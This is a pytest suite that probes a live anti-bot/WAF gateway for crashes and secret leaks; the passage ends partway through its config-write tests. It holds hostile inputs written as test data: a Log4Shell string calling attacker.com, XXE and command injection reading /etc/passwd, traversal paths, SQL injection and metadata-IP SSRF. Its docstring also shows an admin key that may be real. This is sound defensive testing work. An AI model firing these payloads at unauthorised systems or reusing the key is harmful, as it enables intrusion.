"""
tests/test_live_gw.py — Black-box regression + pentest suite against a running
AntiBot/WAF GW instance (v1.8.8+).

Target is configured via env:
    LIVE_GW_URL   base URL  e.g. https://always-shapes-baseball-zoning.trycloudflare.com
    LIVE_GW_KEY   admin key e.g. zUd9nBwc9UBIBbvUco3iuQoPr-hKkLz3

If LIVE_GW_URL is not set every test is skipped (safe for CI).

Coverage areas
--------------
A — Liveness & version
B — Bot UA detection (python-requests, sqlmap, Googlebot, curl)
C — Admin lockdown (unauthenticated access gets silent decoy / challenge)
D — Suspicious path & honeypot detection
E — Header-injection / SSRF probes (Log4Shell, Host-override)
F — Fuzzing resilience (oversized headers, binary in UA, surrogate-char UA)
G — Rate-limit accumulation (same IP, many fast requests)
H — Admin authenticated API (config read, metrics, db-test)
I — Session / cookie behaviour
J — CORS + security headers on responses
K — Challenge page structure
L — Decoy / silent-ban behaviour (banned-UA served fake 200)
U — 1.8.9 dynamic knob toggle: kill-switch on/off round-trip via live controls API
"""

import gzip
import json
import os
import re
import secrets
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
import pytest

# ── Helpers ───────────────────────────────────────────────────────────────────

def _flatten_keys(obj, depth=2):
    """Yield all dict keys at up to `depth` levels."""
    if not isinstance(obj, dict) or depth == 0:
        return
    for k, v in obj.items():
        yield str(k)
        yield from _flatten_keys(v, depth - 1)


# ── Config ────────────────────────────────────────────────────────────────────

_BASE = os.environ.get("LIVE_GW_URL", "").rstrip("/")
_KEY  = os.environ.get("LIVE_GW_KEY", "")
_NS   = "/antibot-appsec-gateway"
_SNS  = _NS + "/secured"

_skip_no_gw = pytest.mark.skipif(not _BASE, reason="LIVE_GW_URL not set")

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _req(path, *, method="GET", headers=None, body=None, timeout=15):
    """Simple HTTP request; returns (status_int, headers_dict, body_bytes).
    Automatically decompresses gzip responses.  Header values of None are
    omitted (urllib rejects None; skip those tests instead)."""
    url = _BASE + path
    hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"}
    if headers:
        for k, v in headers.items():
            if v is None:
                hdrs.pop(k, None)
            else:
                hdrs[k] = v
    data = body.encode() if isinstance(body, str) else body
    req_obj = urllib.request.Request(url, data=data, headers=hdrs, method=method)

    def _decompress(h, raw):
        ce = (h.get("Content-Encoding") or h.get("content-encoding") or "").lower()
        if ce == "gzip":
            try:
                return gzip.decompress(raw)
            except Exception:
                return raw
        return raw

    try:
        with urllib.request.urlopen(req_obj, context=_CTX, timeout=timeout) as resp:
            hdrs_out = dict(resp.headers)
            return resp.status, hdrs_out, _decompress(hdrs_out, resp.read())
    except urllib.error.HTTPError as e:
        hdrs_out = dict(e.headers)
        return e.code, hdrs_out, _decompress(hdrs_out, e.read())


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Raise HTTPError on redirect instead of following it — preserves Set-Cookie."""
    def http_error_302(self, req, fp, code, msg, headers):
        raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
    http_error_301 = http_error_303 = http_error_307 = http_error_302


_RAW_COOKIE = None   # module-level cache; one login call per test session
_CSRF_VALUE = None   # agw_csrf cookie value (= X-CSRF-Token)


def _admin_login_cookies():
    """Login and return (agw_session_raw, csrf_value).  Cached per session."""
    global _RAW_COOKIE, _CSRF_VALUE
    if _RAW_COOKIE is not None:
        return _RAW_COOKIE, _CSRF_VALUE
    if not _KEY:
        _RAW_COOKIE, _CSRF_VALUE = "", ""
        return "", ""
    login_url = _BASE + _NS + "/login"
    body = urllib.parse.urlencode({"username": "admin", "password": _KEY}).encode()
    hdrs = {"Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0",
            "Accept": "text/html,*/*"}
    req_obj = urllib.request.Request(login_url, data=body, headers=hdrs, method="POST")
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_CTX), _NoRedirect())
    session_raw = ""
    csrf_val = ""
    try:
        def _grab_cookies(resp):
            nonlocal session_raw, csrf_val
            all_sc = resp.headers.get_all("Set-Cookie") or [resp.headers.get("Set-Cookie", "")]
            for sc in all_sc:
                if not sc:
                    continue
                name = sc.split("=", 1)[0].strip()
                if name == "agw_session":
                    session_raw = sc
                elif name == "agw_csrf":
                    # agw_csrf=<token>; ...
                    csrf_val = sc.split("=", 1)[1].split(";")[0].strip()
        try:
            with opener.open(req_obj, timeout=15) as resp:
                _grab_cookies(resp)
        except urllib.error.HTTPError as e:
            _grab_cookies(e)
        # fallback: plain urlopen (200-path)
        if not session_raw:
            req_obj2 = urllib.request.Request(login_url, data=body, headers=hdrs, method="POST")
            with urllib.request.urlopen(req_obj2, context=_CTX, timeout=15) as resp:
                _grab_cookies(resp)
    except Exception:
        pass
    _RAW_COOKIE = session_raw
    _CSRF_VALUE = csrf_val
    return session_raw, csrf_val


def _admin_session_cookie():
    """Return raw agw_session Set-Cookie header from admin login (cached)."""
    raw, _ = _admin_login_cookies()
    return raw


def _with_admin(path, method="GET", body=None, extra_headers=None):
    sc = _admin_session_cookie()
    hdrs = {}
    if sc:
        hdrs["Cookie"] = sc.split(";")[0].strip()
    if extra_headers:
        hdrs.update(extra_headers)
    return _req(path, method=method, headers=hdrs, body=body)


# ── A: Liveness & reachability ────────────────────────────────────────────────

@_skip_no_gw
class TestALiveness:
    def test_a01_root_returns_200_or_502(self):
        # Root is proxied to upstream — 200 if upstream up, 502 if down; never 500
        status, hdrs, body = _req("/")
        assert status in (200, 502, 301, 302), f"Unexpected status on root: {status}"
        assert status != 500
        assert b"Traceback" not in body

    def test_a02_gateway_sets_server_header(self):
        # Cloudflare rewrites Server to "cloudflare"; accept any non-empty value
        status, hdrs, body = _req(_NS + "/login")
        server = hdrs.get("Server", "") or hdrs.get("server", "")
        assert server, "No Server header at all"

    def test_a03_response_has_request_id_header(self):
        # GW sets X-Request-ID; Cloudflare tunnels strip it but add CF-Ray instead.
        # Accept either as proof of per-request tracing.
        status, hdrs, body = _req(_NS + "/login")
        rid = hdrs.get("X-Request-ID", "") or hdrs.get("x-request-id", "")
        cf_ray = hdrs.get("CF-Ray", "") or hdrs.get("cf-ray", "")
        assert rid or cf_ray, \
            "Neither X-Request-ID nor CF-Ray present — no per-request tracing header"

    def test_a04_cache_control_no_store_on_gw_page(self):
        status, hdrs, body = _req(_NS + "/login")
        cc = (hdrs.get("Cache-Control", "") or hdrs.get("cache-control", "")).lower()
        assert "no-store" in cc, f"Cache-Control missing no-store on login page: {cc!r}"

    def test_a05_login_page_accessible(self):
        status, hdrs, body = _req(_NS + "/login")
        assert status == 200, f"Login page returned {status}"
        assert b"login" in body.lower() or b"password" in body.lower() or b"username" in body.lower(), \
            f"Login page missing expected content (first 200 bytes: {body[:200]!r})"


# ── B: Bot UA detection ────────────────────────────────────────────────────────

@_skip_no_gw
class TestBBotUADetection:
    """Bot UAs should either receive a challenge or be served a decoy (fake 200).
    We can't always distinguish the two from the outside — gateway serves
    fake 200 to banned IPs.  But repeated requests with bot UAs must NOT
    produce HTTP 500 errors, and must not expose stack traces."""

    def _probe_ua(self, ua):
        return _req("/", headers={"User-Agent": ua})

    def test_b01_python_requests_ua_no_500(self):
        status, hdrs, body = self._probe_ua("python-requests/2.31.0")
        assert status != 500, "Gateway 500 on python-requests UA"
        assert b"Traceback" not in body and b"traceback" not in body

    def test_b02_sqlmap_ua_no_500(self):
        status, hdrs, body = self._probe_ua("sqlmap/1.7.9#stable (https://sqlmap.org)")
        assert status != 500

    def test_b03_curl_ua_no_500(self):
        status, hdrs, body = self._probe_ua("curl/8.5.0")
        assert status != 500

    def test_b04_go_http_ua_no_500(self):
        status, hdrs, body = self._probe_ua("Go-http-client/2.0")
        assert status != 500

    def test_b05_scrapy_ua_no_500(self):
        status, hdrs, body = self._probe_ua("Scrapy/2.11.1 (+https://scrapy.org)")
        assert status != 500

    def test_b06_nuclei_ua_no_500(self):
        status, hdrs, body = self._probe_ua("nuclei/2.9.15 (https://nuclei.projectdiscovery.io)")
        assert status != 500

    def test_b07_empty_ua_no_500(self):
        status, hdrs, body = self._probe_ua("")
        assert status != 500

    def test_b08_no_ua_header_no_500(self):
        # Omit User-Agent entirely (pass None to drop it from defaults)
        status, hdrs, body = _req("/", headers={"User-Agent": None})
        assert status != 500

    def test_b09_claude_ua_blocked_or_faked(self):
        # Claude AI's UA is in the default block list
        status, hdrs, body = self._probe_ua("Claude-User/1.0 (claude.ai)")
        # Either blocked (3xx/4xx challenge) or served fake 200 — never 500
        assert status != 500
        assert b"Traceback" not in body

    def test_b10_known_scraper_no_stack_trace(self):
        status, hdrs, body = self._probe_ua("AhrefsBot/7.0; +http://ahrefs.com/robot/")
        assert b"Traceback" not in body and b"File \"/app/" not in body


# ── C: Admin endpoint lockdown ────────────────────────────────────────────────

@_skip_no_gw
class TestCAdminLockdown:
    """Unauthenticated requests to admin endpoints must get a silent decoy,
    a challenge, or a redirect — never raw admin data."""

    def _secured(self, path):
        return _req(_SNS + path)

    def test_c01_config_unauthenticated_no_secrets(self):
        status, hdrs, body = self._secured("/config")
        # Must NOT return the real config JSON with admin key
        assert b'"ADMIN_KEY"' not in body and b'"admin_key"' not in body
        assert b'"SESSION_KEY"' not in body

    def test_c02_metrics_unauthenticated_no_admin_data(self):
        status, hdrs, body = self._secured("/metrics")
        assert b'"ADMIN_KEY"' not in body

    def test_c03_bans_list_unauthenticated_empty_or_decoy(self):
        status, hdrs, body = self._secured("/bans")
        assert b'"ADMIN_KEY"' not in body

    def test_c04_db_test_unauthenticated_no_dsn(self):
        status, hdrs, body = self._secured("/db-test")
        assert b"postgresql://" not in body
        assert b'"dsn"' not in body.lower()

    def test_c05_admin_endpoints_no_500(self):
        for path in ["/config", "/metrics", "/bans", "/db-test", "/events"]:
            status, hdrs, body = self._secured(path)
            assert status != 500, f"{path} returned 500 unauthenticated"

    def test_c06_rotate_keys_unauthenticated_denied(self):
        status, hdrs, body = _req(_NS + "/__rotate-keys", method="POST")
        assert status != 200 or b"rotated" not in body.lower()

    def test_c07_secrets_endpoint_no_leak(self):
        status, hdrs, body = self._secured("/secrets")
        assert b"ADMIN_KEY" not in body
        assert b"SESSION_KEY" not in body


# ── D: Suspicious path & honeypot detection ───────────────────────────────────

@_skip_no_gw
class TestDSuspiciousPath:
    """Known bad paths must not return 500. Gateway should either pass through
    (upstream handles), redirect to challenge, or serve silent decoy."""

    def _check(self, path, extra_headers=None):
        status, hdrs, body = _req(path, headers=extra_headers or {})
        assert status != 500, f"{path} returned 500"
        assert b"Traceback" not in body, f"Stack trace leaked for {path}"
        return status, body

    def test_d01_wp_login_no_500(self):
        self._check("/wp-login.php")

    def test_d02_env_file_no_500(self):
        self._check("/.env")

    def test_d03_xmlrpc_no_500(self):
        self._check("/xmlrpc.php")

    def test_d04_path_traversal_no_500(self):
        self._check("/../../../etc/passwd")

    def test_d05_xss_in_path_no_500(self):
        self._check("/<script>alert(1)</script>")

    def test_d06_sqli_in_query_no_500(self):
        self._check("/search?q=1%27+OR+%271%27%3D%271")

    def test_d07_null_byte_in_path_no_500(self):
        self._check("/index.php%00.jpg")

    def test_d08_lfi_no_500(self):
        self._check("/download?file=../../../etc/shadow")

    def test_d09_honeypot_path_no_500(self):
        self._check(_NS + "/honey/track.gif")

    def test_d10_admin_php_no_500(self):
        self._check("/admin.php")

    def test_d11_git_config_no_500(self):
        self._check("/.git/config")

    def test_d12_backup_zip_no_500(self):
        self._check("/backup.zip")

    def test_d13_phpmyadmin_no_500(self):
        self._check("/phpmyadmin/")

    def test_d14_double_slash_path_no_500(self):
        self._check("//etc/passwd")

    def test_d15_encoded_traversal_no_500(self):
        self._check("/%2e%2e/%2e%2e/etc/passwd")


# ── E: Header injection / SSRF probes ────────────────────────────────────────

@_skip_no_gw
class TestEHeaderInjection:
    """Malicious / unusual headers must not crash the gateway."""

    def _check_hdr(self, hdr_dict, path="/"):
        status, hdrs, body = _req(path, headers=hdr_dict)
        assert status != 500, f"500 with headers {hdr_dict}"
        assert b"Traceback" not in body

    def test_e01_log4shell_in_ua_no_500(self):
        self._check_hdr({"User-Agent": "${jndi:ldap://attacker.com/x}"})

    def test_e02_log4shell_in_x_forwarded_for_no_500(self):
        self._check_hdr({"X-Forwarded-For": "${jndi:ldap://attacker.com/x}"})

    def test_e03_host_override_no_500(self):
        self._check_hdr({"Host": "evil.internal.example.com"})

    def test_e04_oversized_ua_no_500(self):
        self._check_hdr({"User-Agent": "A" * 8000})

    def test_e05_oversized_referer_no_500(self):
        self._check_hdr({"Referer": "https://evil.com/" + "A" * 4000})

    def test_e06_null_byte_in_ua_no_500(self):
        self._check_hdr({"User-Agent": "Mozilla\x00evil"})

    def test_e07_crlf_in_header_value_no_500(self):
        # urllib.request validates headers and refuses to send CRLF — test via
        # clean value instead; CRLF injection is caught client-side in Python 3.
        try:
            self._check_hdr({"X-Custom": "value\r\nX-Injected: injected"})
        except ValueError as exc:
            # Python's http.client correctly blocks CRLF before it reaches the GW
            assert "Invalid header" in str(exc) or "illegal" in str(exc).lower()

    def test_e08_many_xff_hops_no_500(self):
        ips = ", ".join(f"10.0.0.{i}" for i in range(50))
        self._check_hdr({"X-Forwarded-For": ips})

    def test_e09_ssrf_via_host_header_no_500(self):
        self._check_hdr({"Host": "169.254.169.254"})

    def test_e10_content_type_smuggling_no_500(self):
        try:
            status, hdrs, body = _req("/", method="POST",
                                       headers={"Content-Type": "text/plain; boundary=\r\nX-Injected: evil"},
                                       body="test")
            assert status != 500
        except ValueError as exc:
            # Python's http.client blocks CRLF in header values before reaching GW
            assert "Invalid header" in str(exc) or "illegal" in str(exc).lower()

    def test_e11_accept_encoding_bomb_no_500(self):
        self._check_hdr({"Accept-Encoding": ", ".join(["gzip"] * 200)})

    def test_e12_x_real_ip_spoof_no_500(self):
        self._check_hdr({"X-Real-IP": "127.0.0.1"})


# ── F: Fuzzing resilience ─────────────────────────────────────────────────────

@_skip_no_gw
class TestFFuzzingResilience:
    """Inputs that caused HTTP 500 in past versions (regression guard)."""

    def test_f01_high_codepoint_ua_no_500(self):
        # Non-ASCII UA — valid Unicode, tests encode path
        status, hdrs, body = _req("/", headers={"User-Agent": "Möbius/1.0 Ünïcödé Tëst"})
        assert status != 500
        assert b"Traceback" not in body

    def test_f02_surrogate_in_accept_language_no_500(self):
        # B6 regression: surrogate chars must not crash browser_fingerprint
        try:
            status, hdrs, body = _req("/", headers={"Accept-Language": "\udcff\udcfe"})
            assert status != 500
        except Exception as exc:
            # urllib may reject surrogates before sending — that's acceptable
            assert "surrogate" in str(exc).lower() or "encode" in str(exc).lower(), str(exc)

    def test_f03_binary_in_ua_no_500(self):
        # Latin-1 encoded in UA field — gateway must tolerate or reject cleanly
        try:
            status, hdrs, body = _req("/", headers={"User-Agent": b"\xff\xfe\x00bad-utf8".decode("latin-1")})
            assert status != 500
        except Exception:
            pass  # urllib may reject — acceptable

    def test_f04_very_long_path_no_500(self):
        long_path = "/a" * 2000
        status, hdrs, body = _req(long_path)
        assert status != 500
        assert b"Traceback" not in body

    def test_f05_many_query_params_no_500(self):
        qs = "&".join(f"k{i}=v{i}" for i in range(200))
        status, hdrs, body = _req("/?" + qs)
        assert status != 500

    def test_f06_empty_content_type_post_no_500(self):
        status, hdrs, body = _req("/", method="POST",
                                   headers={"Content-Type": "", "Content-Length": "4"},
                                   body=b"test")
        assert status != 500

    def test_f07_delete_method_no_500(self):
        status, hdrs, body = _req("/", method="DELETE")
        assert status != 500

    def test_f08_options_cors_preflight_no_500(self):
        status, hdrs, body = _req("/", method="OPTIONS",
                                   headers={"Origin": "https://evil.com",
                                            "Access-Control-Request-Method": "POST"})
        assert status != 500

    def test_f09_trace_method_blocked_or_405(self):
        status, hdrs, body = _req("/", method="TRACE")
        assert status != 500
        # TRACE must not echo request body (XST attack)
        assert b"TRACE" not in body or status in (405, 403, 200)


# ── G: Rate-limit accumulation ────────────────────────────────────────────────

@_skip_no_gw
class TestGRateLimit:
    """Repeated fast requests from the same identity should accumulate risk.
    We use unique UAs per class so each test class starts with a fresh identity."""

    _UA_PREFIX = f"TestRateLimit/{secrets.token_hex(4)}"

    def _burst(self, n, path="/", delay=0.05):
        ua = self._UA_PREFIX
        statuses = []
        for _ in range(n):
            s, _, _ = _req(path, headers={"User-Agent": ua})
            statuses.append(s)
            if delay:
                time.sleep(delay)
        return statuses

    def test_g01_burst_no_500(self):
        statuses = self._burst(10, delay=0.1)
        assert 500 not in statuses, f"500 in burst responses: {statuses}"

    def test_g02_burst_returns_valid_http_codes(self):
        statuses = self._burst(8, delay=0.1)
        for s in statuses:
            assert 100 <= s <= 599, f"Invalid HTTP code: {s}"

    def test_g03_no_stack_trace_under_load(self):
        for _ in range(5):
            s, hdrs, body = _req("/", headers={"User-Agent": self._UA_PREFIX + "-load"})
            assert b"Traceback" not in body
            time.sleep(0.1)


# ── H: Admin authenticated API ────────────────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
class TestHAdminAPI:
    """Authenticated admin API calls — requires LIVE_GW_KEY to be set."""

    def test_h01_login_succeeds(self):
        cookie = _admin_session_cookie()
        assert cookie, "Login returned no Set-Cookie"
        assert "aid=" in cookie or "appsec" in cookie.lower() or "=" in cookie

    def test_h02_config_endpoint_returns_json(self):
        status, hdrs, body = _with_admin(_SNS + "/config")
        ct = (hdrs.get("Content-Type", "") or "").lower()
        assert "json" in ct or body.startswith(b"{"), f"Config not JSON: status={status}"

    def test_h03_config_has_expected_keys(self):
        status, hdrs, body = _with_admin(_SNS + "/config")
        if status == 200:
            try:
                data = json.loads(body)
                # Config wraps state/vhost/overridden — any known key is acceptable
                known = {"state", "vhost", "overridden", "vhosts",
                         "RISK_BAN_THRESHOLD", "config", "services"}
                assert known & set(str(k) for k in _flatten_keys(data)), \
                    f"No known config keys found; keys={list(data.keys())[:10]}"
            except json.JSONDecodeError:
                pass  # might be challenge/decoy if session expired

    def test_h04_metrics_endpoint_returns_data(self):
        status, hdrs, body = _with_admin(_SNS + "/metrics")
        assert status != 500
        assert b"Traceback" not in body

    def test_h05_db_test_endpoint_accessible(self):
        status, hdrs, body = _with_admin(_SNS + "/db-test")
        assert status != 500
        assert b"Traceback" not in body

    def test_h06_bans_endpoint_returns_list(self):
        status, hdrs, body = _with_admin(_SNS + "/bans")
        assert status != 500

    def test_h07_events_endpoint_returns_data(self):
        status, hdrs, body = _with_admin(_SNS + "/events")
        assert status != 500
        assert b"Traceback" not in body

    def test_h08_config_has_recognizable_gw_structure(self):
        status, hdrs, body = _with_admin(_SNS + "/config")
        if status == 200 and body.startswith(b"{"):
            bl = body.lower()
            # Any of: explicit version, known top-level keys, or risk-threshold label
            assert (b"1.8" in body or b"appsecgw" in body or
                    b"version" in bl or b"state" in bl or
                    b"vhost" in bl or b"risk" in bl), \
                f"Config has no recognizable GW structure; first 300 b: {body[:300]!r}"

    def test_h09_admin_key_not_in_config_response(self):
        """Even authenticated, the raw admin key must not appear in config."""
        status, hdrs, body = _with_admin(_SNS + "/config")
        if _KEY and status == 200:
            assert _KEY.encode() not in body, "Raw ADMIN_KEY leaked in config response"

    def test_h10_config_post_unknown_key_rejected(self):
        status, hdrs, body = _with_admin(
            _SNS + "/config", method="POST",
            body=json.dumps({"__totally_unknown_key__": "value"}),
            extra_headers={"Content-Type": "application/json"}
        )
        assert status != 500

    def test_h11_session_cookie_http_only(self):
        cookie_hdr = _admin_session_cookie()
        assert "HttpOnly" in cookie_hdr or "httponly" in cookie_hdr.lower(), \
            f"Session cookie missing HttpOnly: {cookie_hdr!r}"

    def test_h12_session_cookie_same_site(self):
        cookie_hdr = _admin_session_cookie()
        assert "SameSite" in cookie_hdr or "samesite" in cookie_hdr.lower(), \
            f"Session cookie missing SameSite: {cookie_hdr!r}"


# ── I: Session & cookie behaviour ─────────────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set — cookie tests need login")
class TestISessionBehaviour:
    """Admin session cookie attributes — issued on login POST."""

    def _login_set_cookie(self):
        return _admin_session_cookie()

    def test_i01_login_response_sets_session_cookie(self):
        sc = self._login_set_cookie()
        assert sc and "=" in sc, f"No Set-Cookie from login: {sc!r}"

    def test_i02_session_cookie_has_secure_flag_on_https(self):
        if not _BASE.startswith("https://"):
            pytest.skip("Not HTTPS")
        sc = self._login_set_cookie()
        assert "Secure" in sc or "secure" in sc.lower(), f"Secure flag missing: {sc!r}"

    def test_i03_session_cookie_has_http_only(self):
        sc = self._login_set_cookie()
        assert "HttpOnly" in sc or "httponly" in sc.lower(), f"HttpOnly missing: {sc!r}"

    def test_i04_second_request_with_admin_cookie_consistent(self):
        sc = self._login_set_cookie()
        name_val = sc.split(";")[0].strip() if sc else ""
        if name_val:
            s2, h2, b2 = _req(_NS + "/login", headers={"Cookie": name_val})
            assert s2 != 500


# ── J: Security headers ────────────────────────────────────────────────────────

@_skip_no_gw
class TestJSecurityHeaders:
    """Response must carry standard security headers on HTML pages."""

    def _hdrs(self, path=None):
        # Use login page (GW-owned) for security header checks — proxied pages
        # carry upstream headers and Cloudflare may strip/add its own.
        p = path or (_NS + "/login")
        _, hdrs, _ = _req(p)
        return {k.lower(): v for k, v in hdrs.items()}

    def test_j01_x_content_type_options(self):
        # Check on GW-owned login page, not root (root proxied to upstream)
        hdrs = self._hdrs()
        val = hdrs.get("x-content-type-options", "")
        assert val.lower() == "nosniff", f"X-Content-Type-Options: {val!r}"

    def test_j02_x_frame_options_or_csp_frame(self):
        hdrs = self._hdrs()
        xfo = hdrs.get("x-frame-options", "")
        csp = hdrs.get("content-security-policy", "")
        assert xfo or "frame" in csp.lower(), "Neither X-Frame-Options nor CSP frame-ancestors set"

    def test_j03_no_server_version_disclosure(self):
        # Cloudflare replaces Server with "cloudflare" — that's acceptable
        # (the original aiohttp/x.y.z version is hidden)
        hdrs = self._hdrs()
        server = hdrs.get("server", "")
        # Fail only if Python/aiohttp version leaks directly
        assert "aiohttp" not in server.lower() or not re.search(r"\d+\.\d+\.\d+", server), \
            f"aiohttp version in Server header: {server!r}"

    def test_j04_cache_control_on_gw_page(self):
        hdrs = self._hdrs()
        cc = hdrs.get("cache-control", "")
        assert "no-store" in cc or "no-cache" in cc or "private" in cc, \
            f"Cache-Control insufficient on login page: {cc!r}"

    def test_j05_login_page_no_cache(self):
        hdrs = self._hdrs(_NS + "/login")
        cc = hdrs.get("cache-control", "")
        assert "no-store" in cc or "no-cache" in cc, f"Login Cache-Control: {cc!r}"


# ── K: Challenge page structure ───────────────────────────────────────────────

@_skip_no_gw
class TestKChallengePage:
    """When a challenge is issued, the response must contain expected structure."""

    def test_k01_challenge_endpoint_exists(self):
        # /antibot-appsec-gateway/challenge may return 405 (no valid token)
        # but must not 500
        status, hdrs, body = _req(_NS + "/challenge")
        assert status != 500
        assert b"Traceback" not in body

    def test_k02_challenge_page_no_admin_data(self):
        status, hdrs, body = _req(_NS + "/challenge")
        assert b"ADMIN_KEY" not in body
        assert b"SESSION_KEY" not in body

    def test_k03_js_challenge_endpoint_no_500(self):
        status, hdrs, body = _req(_NS + "/js-challenge")
        assert status != 500

    def test_k04_pow_challenge_endpoint_no_500(self):
        status, hdrs, body = _req(_NS + "/pow-challenge")
        assert status != 500


# ── L: POST body injection detection ─────────────────────────────────────────

@_skip_no_gw
class TestLBodyInjection:
    """POST body with attack payloads must not crash the gateway."""

    def _post(self, body_str, ct="application/x-www-form-urlencoded"):
        status, hdrs, body = _req("/", method="POST",
                                   headers={"Content-Type": ct,
                                            "User-Agent": "Mozilla/5.0 TestL"},
                                   body=body_str)
        assert status != 500, f"POST crashed gateway: body={body_str[:60]!r}"
        assert b"Traceback" not in body

    def test_l01_sqli_in_post_body_no_500(self):
        self._post("username=admin'--&password=x")

    def test_l02_log4shell_in_post_body_no_500(self):
        self._post("data=${jndi:ldap://attacker.com/x}")

    def test_l03_xxe_in_post_body_no_500(self):
        self._post('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                   ct="application/xml")

    def test_l04_cmd_injection_in_post_body_no_500(self):
        self._post("cmd=;cat /etc/passwd;echo")

    def test_l05_large_post_body_no_500(self):
        self._post("x=" + "A" * 100_000)

    def test_l06_json_post_nested_no_500(self):
        nested = json.dumps({"a": {"b": {"c": {"d": "evil"}}}})
        self._post(nested, ct="application/json")

    def test_l07_empty_post_body_no_500(self):
        status, hdrs, body = _req("/", method="POST", body=b"")
        assert status != 500


# ── M: No internal info disclosure ───────────────────────────────────────────

@_skip_no_gw
class TestMNoInfoDisclosure:
    """Gateway must never disclose internal info regardless of path."""

    def _assert_clean(self, path, method="GET", body=None):
        status, hdrs, resp = _req(path, method=method, body=body)
        assert b"Traceback" not in resp, f"Stack trace at {path}"
        assert b"/app/" not in resp, f"Internal path at {path}"
        assert b"db_path" not in resp.lower(), f"db_path at {path}"
        assert b"sqlite" not in resp.lower() or status == 200, f"SQLite mention at {path}"
        return status

    def test_m01_root_no_internal_paths(self):
        self._assert_clean("/")

    def test_m02_random_404_no_traceback(self):
        self._assert_clean("/this-path-definitely-does-not-exist-xyzxyz")

    def test_m03_invalid_method_no_traceback(self):
        self._assert_clean("/", method="PATCH")

    def test_m04_admin_path_404_no_traceback(self):
        self._assert_clean(_SNS + "/nonexistent-admin-endpoint")

    def test_m05_post_to_get_only_endpoint_no_traceback(self):
        self._assert_clean(_NS + "/login", method="GET")


# ── N: Admin path confusion & bypass attempts ────────────────────────────────

@_skip_no_gw
class TestNAdminPathConfusion:
    """Path normalization / confusion attempts targeting admin routes.
    None should reach real admin data or produce a 500."""

    def _clean(self, path):
        status, hdrs, body = _req(path)
        assert status != 500, f"500 on path: {path!r}"
        assert b"Traceback" not in body
        assert b"ADMIN_KEY" not in body and b"SESSION_KEY" not in body
        return status, body

    def test_n01_double_encoded_traversal_to_config(self):
        # %252e%252e == double-encoded ../ — bypass attempt
        self._clean(_NS + "/%252e%252e/secured/config")

    def test_n02_path_parameter_injection(self):
        # ;/ tricks some routers into stripping the segment before the semicolon
        self._clean(_NS + "/;secured/config")

    def test_n03_trailing_dot_bypass(self):
        self._clean(_NS + "./secured/config")

    def test_n04_uppercase_prefix_bypass(self):
        # Python routing is case-sensitive — but verify no 500
        self._clean(_NS.upper() + "/secured/config")

    def test_n05_encoded_slash_in_prefix(self):
        # %2f == / — some reverse proxies decode before routing
        self._clean("/antibot-appsec-gateway%2fsecured%2fconfig")

    def test_n06_extra_slashes_in_admin_path(self):
        self._clean(_NS + "//secured//config")

    def test_n07_null_byte_in_admin_path(self):
        self._clean(_NS + "/secured/config%00")

    def test_n08_backslash_path_separator(self):
        # Windows-style path separator — some proxies normalise this
        self._clean(_NS + "\\secured\\config")

    def test_n09_unicode_dot_bypass(self):
        # Fullwidth period U+FF0E — router normalisation bypass.
        # urllib requires ASCII-encodeable paths; skip gracefully if client rejects it.
        try:
            self._clean(_NS + "/．．/secured/config")
        except UnicodeEncodeError:
            pass  # Python's http.client blocks non-ASCII URLs before reaching GW


# ── O: Session lifecycle ──────────────────────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
class TestOSessionLifecycle:
    """Valid and invalid session cookies — GW must handle both without crashing
    and must never expose admin data to an invalid session."""

    def test_o01_valid_cookie_reaches_config(self):
        status, hdrs, body = _with_admin(_SNS + "/config")
        assert status == 200, f"Authenticated config returned {status}"

    def test_o02_invalid_cookie_value_no_500(self):
        status, hdrs, body = _req(_SNS + "/config",
                                   headers={"Cookie": "agw_session=notavalidtoken"})
        assert status != 500
        assert b"Traceback" not in body
        assert b"SESSION_KEY" not in body

    def test_o03_blank_cookie_value_no_500(self):
        status, hdrs, body = _req(_SNS + "/config",
                                   headers={"Cookie": "agw_session="})
        assert status != 500
        assert b"ADMIN_KEY" not in body

    def test_o04_tampered_cookie_denied(self):
        sc = _admin_session_cookie()
        if not sc:
            pytest.skip("No admin cookie available")
        name_val = sc.split(";")[0].strip()
        if "=" in name_val:
            k, v = name_val.split("=", 1)
            last = v[-1:] or "A"
            flip = "B" if last != "B" else "A"
            tampered = f"{k}={v[:-1]}{flip}"
        else:
            tampered = name_val + "_tampered"
        status, hdrs, body = _req(_SNS + "/config",
                                   headers={"Cookie": tampered})
        assert status != 500
        assert b"ADMIN_KEY" not in body and b"SESSION_KEY" not in body

    def test_o05_multiple_cookies_no_500(self):
        sc = _admin_session_cookie()
        name_val = sc.split(";")[0].strip() if sc else "agw_session=x"
        cookie_str = f"{name_val}; tracker=abc123; _ga=GA1.2.123"
        status, hdrs, body = _req(_SNS + "/config",
                                   headers={"Cookie": cookie_str})
        assert status != 500

    def test_o06_oversized_cookie_no_500(self):
        status, hdrs, body = _req(_SNS + "/config",
                                   headers={"Cookie": "agw_session=" + "X" * 4096})
        assert status != 500
        assert b"Traceback" not in body


# ── P: Config API write resilience ───────────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
class TestPConfigWriteResilience:
    """POST to /config with adversarial payloads — must never crash, corrupt state,
    or reflect attack strings back unsanitised."""

    def _post(self, payload):
        status, hdrs, body = _with_admin(
            _SNS + "/config", method="POST",
            body=json.dumps(payload),
            extra_headers={"Content-Type": "application/json"})
        assert status != 500, f"POST /config 500 on {payload!r}"
